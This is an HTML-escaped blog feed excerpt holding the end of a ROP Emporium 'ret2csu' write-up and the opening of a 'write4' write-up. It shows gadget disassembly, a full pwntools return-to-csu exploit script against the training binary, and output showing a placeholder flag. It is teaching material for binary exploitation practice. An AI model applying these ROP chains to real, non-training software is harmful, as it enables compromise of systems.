&lt;span style=&#34;color:#06b6ef&#34;&gt;payload&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;pop_gadget&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;#&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;retaddr&lt;/span&gt;
&lt;span style=&#34;color:#06b6ef&#34;&gt;payload&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;pwn.p64&lt;/span&gt;(&lt;span style=&#34;color:#f99b15&#34;&gt;0x4343434343434343&lt;/span&gt;)&lt;span style=&#34;color:#ef6155&#34;&gt;#&lt;/span&gt;rbx
&lt;span style=&#34;color:#06b6ef&#34;&gt;payload&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;pwn.p64&lt;/span&gt;(&lt;span style=&#34;color:#f99b15&#34;&gt;0x4242424242424242&lt;/span&gt;)&lt;span style=&#34;color:#ef6155&#34;&gt;#&lt;/span&gt;rbp
&lt;span style=&#34;color:#06b6ef&#34;&gt;payload&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;pwn.p64&lt;/span&gt;(&lt;span style=&#34;color:#f99b15&#34;&gt;0x4141414141414141&lt;/span&gt;) &lt;span style=&#34;color:#ef6155&#34;&gt;#&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;r12&lt;/span&gt;
&lt;span style=&#34;color:#06b6ef&#34;&gt;payload&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;pwn.p64&lt;/span&gt;(&lt;span style=&#34;color:#f99b15&#34;&gt;0xdeadbeefdeadbeef&lt;/span&gt;) &lt;span style=&#34;color:#ef6155&#34;&gt;#&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;r13&lt;/span&gt;
&lt;span style=&#34;color:#06b6ef&#34;&gt;payload&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;pwn.p64&lt;/span&gt;(&lt;span style=&#34;color:#f99b15&#34;&gt;0xcafebabecafebabe&lt;/span&gt;) &lt;span style=&#34;color:#ef6155&#34;&gt;#&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;r14&lt;/span&gt;
&lt;span style=&#34;color:#06b6ef&#34;&gt;payload&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;pwn.p64&lt;/span&gt;(&lt;span style=&#34;color:#f99b15&#34;&gt;0xd00df00dd00df00d&lt;/span&gt;) &lt;span style=&#34;color:#ef6155&#34;&gt;#&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;r15&lt;/span&gt;

&lt;span style=&#34;color:#06b6ef&#34;&gt;open&lt;/span&gt;(&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;payload&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;wb&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#ef6155&#34;&gt;.write&lt;/span&gt;(&lt;span style=&#34;color:#ef6155&#34;&gt;payload&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now, because we are able to control the registers we want, we need to determine the correct or desired values for &lt;strong&gt;rbx, rbp and r12&lt;/strong&gt; registers because 0x41&amp;hellip;,  0x42&amp;hellip;., 0x43&amp;hellip; are not valid memory addresses. Because after execution of our second rop gadget, we need to set right values of rbp and rbx due to a loop conditional.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400680&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;64&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    rdx,&lt;span style=&#34;color:#ef6155&#34;&gt;r15&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400683&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;67&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    rsi,&lt;span style=&#34;color:#ef6155&#34;&gt;r14&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400686&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;70&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    edi,r13d
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400689&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;73&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color:#fec418&#34;&gt;QWORD&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;PTR&lt;/span&gt; [&lt;span style=&#34;color:#ef6155&#34;&gt;r12&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;rbx&lt;span style=&#34;color:#5bc4bf&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;8&lt;/span&gt;]
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000040068d&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;77&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;add&lt;/span&gt;    rbx,&lt;span style=&#34;color:#f99b15&#34;&gt;0x1&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400691&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;81&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;cmp&lt;/span&gt;    rbp,rbx
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400694&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;84&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;jne&lt;/span&gt;    &lt;span style=&#34;color:#f99b15&#34;&gt;0x400680&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;__libc_csu_init&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;64&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400696&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;86&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;add&lt;/span&gt;    rsp,&lt;span style=&#34;color:#f99b15&#34;&gt;0x8&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The address of second gadget starts at &lt;strong&gt;0x0000000000400680&lt;/strong&gt;,in which we are setting the values of rdi,r14 and rdx with correct argument values. we need to set the values of &lt;strong&gt;rbx&lt;/strong&gt; and &lt;strong&gt;rbp&lt;/strong&gt; correctly so that conditional &lt;strong&gt;cmp&lt;/strong&gt; is always true. Because of add instruction of 1 to rbx, we need to set the rbx value to 0 and rbp value to 1. when the comparison is being done, the values are equal and Zero flag is set. Adjust values in payload script and single step to confirm the validity of new values in the memory.&lt;/p&gt;
&lt;p&gt;For register &lt;strong&gt;r12&lt;/strong&gt;, we set the value to a memory region that is executable. In the binary, the &lt;strong&gt;.bss&lt;/strong&gt; section is executable. we now set the r12 register with the memory address of bss section. After executing our second rop chain gadget, we need to adjust the stack as shown in the exploit code to avoid segmentation fault.&lt;/p&gt;
&lt;p&gt;Lastly we need to control the &lt;strong&gt;rdi&lt;/strong&gt; register with the value &lt;strong&gt;0xdeadbeefdeadbeef&lt;/strong&gt;. Because we have full control of rdx and rsi register, we need to look for &lt;strong&gt;pop rdi, ret&lt;/strong&gt; gadget.&lt;/p&gt;
&lt;p&gt;The pop rdi, ret gadget&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x004006a3&lt;/span&gt;                 &lt;span style=&#34;color:#f99b15&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;f&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;pop&lt;/span&gt; rdi
  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x004006a4&lt;/span&gt;                 &lt;span style=&#34;color:#ef6155&#34;&gt;c3&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;ret&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now we can pass the &lt;strong&gt;0xdeadbeefdeadbeef&lt;/strong&gt; argument to the ret2win function.Now we have all the correct values of rdi, rsi and rdx correctly set, calling the ret2win function will result to us getting the correct flag.&lt;/p&gt;
&lt;h2 id=&#34;exploit&#34;&gt;Exploit&lt;/h2&gt;
&lt;p&gt;The full code of the rop is as shown below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python3&#34; data-lang=&#34;python3&#34;&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#fec418&#34;&gt;pwn&lt;/span&gt;

pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;context&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;encoding &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;latin-1&amp;#34;&lt;/span&gt; 
pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;warnings&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;simplefilter(&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;ignore&amp;#34;&lt;/span&gt;)
pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;context&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;arch &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;amd64&amp;#34;&lt;/span&gt;
io &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;process(&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;./ret2csu&amp;#39;&lt;/span&gt;)

&lt;span style=&#34;color:#776e71&#34;&gt;#arguments passed to ret2win function ret2win(arg1, arg2, arg3)&lt;/span&gt;
arg1 &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt;pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#f99b15&#34;&gt;0xdeadbeefdeadbeef&lt;/span&gt;)
arg2 &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt;pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#f99b15&#34;&gt;0xcafebabecafebabe&lt;/span&gt;)
arg3 &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt;pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#f99b15&#34;&gt;0xd00df00dd00df00d&lt;/span&gt;)

ret2win_addr &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt;pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;p64(io&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;elf&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;plt[&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;ret2win&amp;#39;&lt;/span&gt;])   &lt;span style=&#34;color:#776e71&#34;&gt;#resolve address of ret2win function&lt;/span&gt;
pop_rbx_rbp_r12_r13_r14_r15_addr &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#f99b15&#34;&gt;0x0040069a&lt;/span&gt;)  &lt;span style=&#34;color:#776e71&#34;&gt;#first stage gadget&lt;/span&gt;
dereference_pointer &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#f99b15&#34;&gt;0x00600e48&lt;/span&gt;)  &lt;span style=&#34;color:#776e71&#34;&gt;#bss area which is executable&lt;/span&gt;
stage2_addr &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#f99b15&#34;&gt;0x00400680&lt;/span&gt;)  &lt;span style=&#34;color:#776e71&#34;&gt;#addr of second stage rop chain&lt;/span&gt;
pop_rdi &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#f99b15&#34;&gt;0x004006a3&lt;/span&gt;)

&lt;span style=&#34;color:#776e71&#34;&gt;#ropchains&lt;/span&gt;
&lt;span style=&#34;color:#776e71&#34;&gt;#stage1 ropchain&lt;/span&gt;
&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;&amp;#39;&amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;            0x0040069a      pop   rbx
&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;│           0x0040069b      pop   rbp
&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;│           0x0040069c      pop   r12
&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;│           0x0040069e      pop   r13
&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;│           0x004006a0      pop   r14
&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;│           0x004006a2      pop   r15
&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;└           0x004006a4      ret
&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color:#776e71&#34;&gt;#Determine the loop values for conditional branch&lt;/span&gt;
&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;&amp;#39;&amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;╎│          0x00400689      call  qword [r12 + rbx*8]
&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;│      ╎│   0x0040068d      add   rbx, 1
&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;│      ╎│   0x00400691      cmp   rbp, rbx
&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;│      └──&amp;lt; 0x00400694      jne   0x400680
&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;


stage1 &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; pop_rbx_rbp_r12_r13_r14_r15_addr
stage1 &lt;span style=&#34;color:#5bc4bf&#34;&gt;+=&lt;/span&gt; pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#f99b15&#34;&gt;0&lt;/span&gt;)   &lt;span style=&#34;color:#776e71&#34;&gt;#set RBP=0&lt;/span&gt;
stage1 &lt;span style=&#34;color:#5bc4bf&#34;&gt;+=&lt;/span&gt; pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#f99b15&#34;&gt;1&lt;/span&gt;)   &lt;span style=&#34;color:#776e71&#34;&gt;#set RBX=1&lt;/span&gt;
stage1 &lt;span style=&#34;color:#5bc4bf&#34;&gt;+=&lt;/span&gt; dereference_pointer &lt;span style=&#34;color:#776e71&#34;&gt;#set R12&lt;/span&gt;
stage1 &lt;span style=&#34;color:#5bc4bf&#34;&gt;+=&lt;/span&gt; arg1   &lt;span style=&#34;color:#776e71&#34;&gt;#R13&lt;/span&gt;
stage1 &lt;span style=&#34;color:#5bc4bf&#34;&gt;+=&lt;/span&gt; arg2   &lt;span style=&#34;color:#776e71&#34;&gt;#R14&lt;/span&gt;
stage1 &lt;span style=&#34;color:#5bc4bf&#34;&gt;+=&lt;/span&gt; arg3   &lt;span style=&#34;color:#776e71&#34;&gt;#R15&lt;/span&gt;
stage1 &lt;span style=&#34;color:#5bc4bf&#34;&gt;+=&lt;/span&gt; stage2_addr
stage1 &lt;span style=&#34;color:#5bc4bf&#34;&gt;+=&lt;/span&gt; pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#f99b15&#34;&gt;0&lt;/span&gt;)&lt;span style=&#34;color:#5bc4bf&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;7&lt;/span&gt;   &lt;span style=&#34;color:#776e71&#34;&gt;#adjust the stack&lt;/span&gt;



&lt;span style=&#34;color:#776e71&#34;&gt;#stage2&lt;/span&gt;
&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;&amp;#39;&amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;   ┌──&amp;gt;     0x00400680      mov   rdx, r15
&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;│      ╎│   0x00400683      mov   rsi, r14
&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;│      ╎│   0x00400686      mov   edi, r13d
&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;│      ╎│   0x00400689      call  qword [r12 + rbx*8]
&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;

stage2 &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; pop_rdi
stage2 &lt;span style=&#34;color:#5bc4bf&#34;&gt;+=&lt;/span&gt;arg1
stage2 &lt;span style=&#34;color:#5bc4bf&#34;&gt;+=&lt;/span&gt;ret2win_addr 


payload &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;32&lt;/span&gt;
payload &lt;span style=&#34;color:#5bc4bf&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;B&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;8&lt;/span&gt;
payload &lt;span style=&#34;color:#5bc4bf&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;join([
    stage1,
    stage2
    ])

io&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;writeafter(&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;&amp;gt;&amp;#39;&lt;/span&gt;, payload)
pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;info(io&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;recvall()&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;decode())
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Running the exploit code above we get the correct flag&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;vx@archie:ret2csu$ python3 xpl.py 
&lt;span style=&#34;color:#5bc4bf&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#5bc4bf&#34;&gt;]&lt;/span&gt; Starting local process &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;./ret2csu&amp;#39;&lt;/span&gt;: pid &lt;span style=&#34;color:#f99b15&#34;&gt;18869&lt;/span&gt;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE &lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;0x400000&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt;
    RUNPATH:  b&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#5bc4bf&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#5bc4bf&#34;&gt;]&lt;/span&gt; Receiving all data: Done &lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;45B&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color:#5bc4bf&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#5bc4bf&#34;&gt;]&lt;/span&gt; Process &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;./ret2csu&amp;#39;&lt;/span&gt; stopped with exit code &lt;span style=&#34;color:#f99b15&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;pid 18869&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color:#5bc4bf&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#5bc4bf&#34;&gt;]&lt;/span&gt;  Thank you!
    ROPE&lt;span style=&#34;color:#5bc4bf&#34;&gt;{&lt;/span&gt;a_placeholder_32byte_flag!&lt;span style=&#34;color:#5bc4bf&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;references&#34;&gt;References&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; Universal ROP or Return-to-csu&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Linux program startup&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
</description>
        </item>
        <item>
        <title>Return-Oriented Programming - Write4</title>
        <link>https://thuri10.github.io/p/return-oriented-programming-write4/</link>
        <pubDate>Mon, 20 Dec 2021 20:49:54 +0300</pubDate>
        
        <guid>https://thuri10.github.io/p/return-oriented-programming-write4/</guid>
        <description>&lt;img src="https://thuri10.github.io/post/ropemporium/write4.jpg" alt="Featured image of post Return-Oriented Programming - Write4" /&gt;&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
&lt;p&gt;Challenge Description&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Our first foray into proper gadget use.
A useful function is still present, but we&amp;rsquo;ll need to write a string into memory somehow.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The goal of this challenge is understanding how to abuse readable and writable memory regions in binary files.The target binary can be downloaded from the authors website &lt;a class=&#34;link&#34; href=&#34;https://ropemporium.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;ropemporium&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;First we check the binary protections enabled on the downloaded binary. Only &lt;strong&gt;NX&lt;/strong&gt; (Not executable) is enabled on the binary according to checksec binary utility as shown in image below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE &lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;0x400000&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;For analysis of binary, we use gdb debugger to analyze the functions in the binary. We disassemble the main function which is the entry point of analysis.&lt;/p&gt;
